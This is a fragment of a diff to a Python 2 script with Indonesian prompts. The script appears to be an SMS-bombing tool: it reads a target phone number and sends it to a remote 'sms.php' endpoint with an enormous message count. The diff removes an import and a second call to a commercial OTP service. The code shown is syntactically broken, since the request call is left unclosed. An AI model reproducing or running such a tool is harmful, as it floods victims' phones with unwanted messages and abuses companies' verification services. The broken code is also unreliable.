@@ -4,7 +4,6 @@ import os
 import time
 import sys
 import urllib2
-import urllib3
 import random
 G0 = '\x1b[0;32m'
 G1 = '\x1b[1;32m'
@@ -48,8 +47,6 @@ try:
     numb = raw_input('   %s[+] %sTarget : ' % (P0, W0))
     print '   %s[+] %sSilahkan tunggu ...' % (P0, W0)
     urllib2.urlopen('https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor=%s&paket=99999999999999999999999'
-	urllib3.urlopen('https://www.tokocash.com/oauth/otp'
-
                      % numb)
     print '''   %s[+] %sSukses 
 
